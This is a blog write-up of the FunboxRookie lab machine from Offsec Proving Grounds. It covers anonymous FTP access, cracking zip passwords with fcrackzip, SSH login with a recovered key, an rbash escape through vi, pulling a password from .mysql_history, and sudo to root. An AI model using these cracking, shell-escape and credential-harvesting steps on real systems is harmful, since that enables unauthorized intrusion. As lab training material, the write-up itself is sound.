---
title: "Proving grounds Play: FunboxRookie"
layout: post
date: 2023-09-14 01:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)
|   256 15004667809b40123a0c6607db1d1847 (ECDSA)
|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/logs/
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web PORT: 80

![img](/assets/images/CTF/Proving_Grounds/FunboxRookie/web.png)

## FTP PORT: 21

```sh
lftp> ls
229 Entering Extended Passive Mode (|||63774|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
```

Download all files and extract the files, which are password protected.

### Cracking password

```sh
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
```

Use the above tool to crack the password, an alternative way to crack the password is to use `zip2john` tool to create hash for the zip files and then later use john to crack the hashes.

After trying to crack passwords for all the files, the process resulted in failure except for files `tom.zip` and `catherine.zip`.

![img](/assets/images/CTF/Proving_Grounds/FunboxRookie/crack.png)

Extract the zip files using the passwords and use the `id_rsa` key to login to the remote machine using SSH.

The user `tom` has restricted shell `rbash`. Use the below technique to bypass the restriction.

```sh
vi
:set shell=/bin/bash
:shell
```

The user has a `.mysql_history` file in the machine, which we can check for passwords.

```sh
tom@funbox2:~$ ls -al
total 48
drwxr-xr-x 5 tom  tom  4096 Sep 14 01:51 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom    53 Sep 14 01:49 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Sep 14 01:48 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw------- 1 tom  tom  1675 Jul 25  2020 id_rsa
-rw-r--r-- 1 tom  tom    33 Sep 14 01:31 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Sep 14 01:52 .ssh
```

The file has the password for user tom.

```text
insert\040into\040support\040(tom,\040█████████);
```

## Privilege Escalation

After checking the permissions for the user tom he has ALL the permissions in the machine which allows us to get root shell using `sudo su` and user tom password.

```sh
User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

![img](/assets/images/CTF/Proving_Grounds/FunboxRookie/root.png)

**Root obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).